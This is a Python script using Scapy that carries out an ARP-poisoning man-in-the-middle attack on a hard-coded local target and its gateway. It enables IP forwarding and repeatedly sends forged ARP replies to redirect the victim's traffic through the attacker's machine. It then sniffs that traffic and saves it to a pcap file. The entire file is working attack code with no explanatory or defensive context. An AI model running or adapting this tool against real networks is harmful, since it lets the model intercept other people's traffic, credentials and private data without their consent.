from scapy.all import *
import os
import sys
import threading
import signal

def restore_target(g_ip,g_mac,t_ip,t_mac):
    send(ARP(op=2, psrc=g_ip,pdst=t_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=g_mac,count=5))
    send(ARP(op=2, psrc=t_ip,pdst=g_ip,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=t_mac,count=5))

    os.kill(os.getpid(), signal.SIGINT)
    
def get_mac(ip):
    responses,unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),timeout=2,retry=10)
    for s,r in responses:
        return r[Ether].src
    return None

def poison_target(g_ip,g_mac,t_ip,t_mac):
    poison_target           = ARP()
    poison_target.op        = 2
    poison_target.psrc      = g_ip
    poison_target.pdst      = t_ip
    poison_target.hwdst     = t_mac

    poison_gateway = ARP()
    poison_gateway.op       = 2
    poison_gateway.psrc     = t_ip
    poison_gateway.pdst     = g_ip
    poison_gateway.hwdst    = g_mac

    print '[*] Beginning the ARP poison'
    while True:
        try:
            send(poison_target)
            send(poison_gateway)

            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(g_ip,g_mac,t_ip,t_mac)
    print '[*] Attack finished'

    
interface = 'wlan0'
target_ip = '192.168.1.70'
gateway_ip = '192.168.1.1'
packet_count = 1000

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
conf.verb = 0

print '[*] setting up %s' % interface

# Gateway // Router
gateway_mac = get_mac(gateway_ip)
if(gateway_mac is None):
    print '[!] Failed to get gateway'
    sys.exit(0)
print '[*] Gateway %s is at %s' % (gateway_ip, gateway_mac)

# Target
target_mac = get_mac(target_ip)
if(target_mac is None):
    print '[!] Failed to get target'
    sys.exit(0)
print '[*] Gateway %s is at %s' % (target_ip, target_mac)

poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print '[*] Starting sniffer for %d packets' % packet_count
    bpf_filter = 'ip host %s' % target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
    wrpcap('/root/Desktop/arper.pcap', packets)
except KeyboardInterrupt:
    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
    sys.exit(0)
print '[*] Finished capturing packets'
